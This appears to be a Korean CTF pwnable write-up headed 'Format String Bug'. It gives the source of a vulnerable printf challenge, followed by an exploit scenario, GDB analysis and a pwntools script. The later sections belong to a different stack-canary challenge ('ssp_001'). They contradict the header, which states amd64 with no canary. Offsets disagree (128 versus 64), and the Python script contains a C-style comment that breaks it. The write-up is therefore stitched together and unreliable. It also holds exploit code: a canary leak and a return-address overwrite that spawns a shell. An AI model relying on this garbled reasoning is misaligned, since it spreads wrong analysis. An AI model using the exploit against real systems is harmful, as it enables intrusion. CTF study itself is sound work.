# 🚩 [Format String Bug]

> **Category:** Pwnable  
> **Difficulty:** <span style="color: #FFD700; font-weight: bold;">G4</span>  
> **Flag:** `DH{--}`  

---

## 📄 1. Challenge Description
* **Environment :**
  ```text
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
* **Reference :**
  ```text
    Format String Bug
---

## 🔍 2. Vulnerability Analysis

이 문제는 **Position-Independent Executable(PIE)**가 적용되어 있어 코드영역의 주소가 계속 바뀜니다. 따라서 **1) Offset**을 구한후 **2) changeme**함수의 주소를 계산해야 합니다.

### Code Review & Vulnerable Points
C 언어 의사 코드(Decompiled Code) 및 핵심 메뉴 기능 분석:

```c
// Name: fsb_overwrite.c
// Compile: gcc -o fsb_overwrite fsb_overwrite.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_string(char *buf, size_t size) {
  ssize_t i = read(0, buf, size);
  if (i == -1) {
    perror("read");
    exit(1);
  }
  if (i < size) {
    if (i > 0 && buf[i - 1] == '\n') i--;
    buf[i] = 0;
  }
}

int changeme;

int main() {
  char buf[0x20];
  
  setbuf(stdout, NULL);
  
  while (1) {
    get_string(buf, 0x20);
    printf(buf);                     // Format String Bug 가능
    puts("");
    if (changeme == 1337) {          //changeme를 1337로 바꾸면 성공
      system("/bin/sh");
    }
  }
}
```
## 🗡️ 3. Exploit Scenario (공격 시나리오)

1. **`Format String Bug 사용:**
   * buf를 0x20만큼 입력을 할 수 있습니다.
   * FSB를 통해 changeme 주소와 changeme의 값을 변경 가능합니다.

2. **`[E]xit` 메뉴 사용:**
   * `name_len`에 충분히 큰 값(예: 128)을 입력합니다.
   * `Payload = Dummy + Canary + Dummy + get_shell()` 형태로 페이로드를 구성하여 전송합니다.

3. **Shell 획득 및 Flag 획득**

---


## 🕵️‍♀️ 4. Appendix: GDB Disassembly & Analysis (GDB 분석)

### 1. Stack Canary Storage
함수 시작 부분에서 `%gs:0x14`로부터 Canary 값을 가져와 스택에 저장하는 어셈블리 코드입니다.

```assembly
0x0804873e <+19>:    mov    %gs:0x14,%eax
0x08048744 <+25>:    mov    %eax,-0x8(%ebp)
```

* **Canary Location:** `ebp - 0x8` (Decimal: `ebp - 8`)

---

### 2. Buffer & Canary Offset Calculation

사용자 입력을 받는 버퍼(`box`)의 주소와 Canary 위치 차이를 이용해 Offset을 계산합니다.

```assembly
; Buffer (`box`) 시작 위치 확인 (예시)
   0x080487d0 <+165>:   add    $0x4,%esp
   0x080487d3 <+168>:   push   $0x40
   0x080487d5 <+170>:   lea    -0x88(%ebp),%eax
   0x080487db <+176>:   push   %eax
   0x080487dc <+177>:   push   $0x0
   0x080487de <+179>:   call   0x80484a0 <read@plt>
```

#### Offset 계산식
* **Buffer 주소:** `ebp - 0x88` (Decimal: 136)
* **Canary 주소:** `ebp - 0x8` (Decimal: 8)
* **Offset:** $136 - 8 = \mathbf{128 \text{ bytes}}$

> **결론:** `box` 배열 시작점으로부터 **128바이트** 떨어진 지점에 Canary가 위치합니다.

---

## 💥 5. Exploit Script (`ex.py`)

```python
from pwn import *

#p = process("./ssp_001")
p=remote("host3.dreamhack.games",18707)
#print(f"PID : {p.pid}")
canary = b"\x00"
get_shell = 0x80486b9

for i in range(129,132,1): //box에서 canary까지 index
    p.sendafter(b"> ",b"P")
    p.sendlineafter(b"Element index : ", str(i).encode())
    p.recvuntil(b"is : ")
    a = p.recv(2)
    canary += unhex(a) # 예) "08" -> b"\x08" 

canary = u32(canary)  # 예) b"\x08" -> 0x08
p.sendafter(b"> ",b"E")
p.sendlineafter(b"Name Size : ", b"90")

payload = b"a" * 64                
payload += p32(canary) # 예) 0x08 -> b"\x08"           
payload += b"a" * 8
payload += p32(get_shell)


p.sendafter(b"Name : ", payload)

p.interactive()
```
---




## 💡 6. Code Analysis & Deep Dive (주요 포인트 분석)

* **Canary Leak (OOB 이용):**
  * `box` 배열 시작점부터 Canary까지의 오프셋이 `128`부터 시작하며, 4바이트(`128`, `129`, `130`, `131` 인덱스)에 걸쳐 존재합니다.
  * 32비트 시스템의 Canary 첫 번째 바이트는 항상 `\x00` (Null Byte)이므로, `canary = b"\x00"`으로 시작한 뒤 나머지 3바이트를 16진수 문자열로 수신받아 `unhex()` 후 병합하였습니다.
* **Payload Structure:**
  * `Dummy (64 bytes)` + `Canary (4 bytes)` + `Dummy/SFP (8 bytes)` + `RET (4 bytes)`
  * 정확하게 수집한 Canary 값을 덮어씌움으로써 `Stack Smashing Detected` 에러 방지 메커니즘을 성공적으로 우회하였습니다.

---

## 🎓 7. Retrospective / Takeaways (요약 및 느낀 점)

* 32비트 환경에서의 Stack Canary Structure 및 Little-Endian 변환 과정(`p32`/`u32`)을 재점검할 수 있었습니다.
* pwntools의 `unhex()` 기능을 활용해 16진수 텍스트 데이터를 효율적으로 바이트 데이터로 변환하는 방법을 익혔습니다.
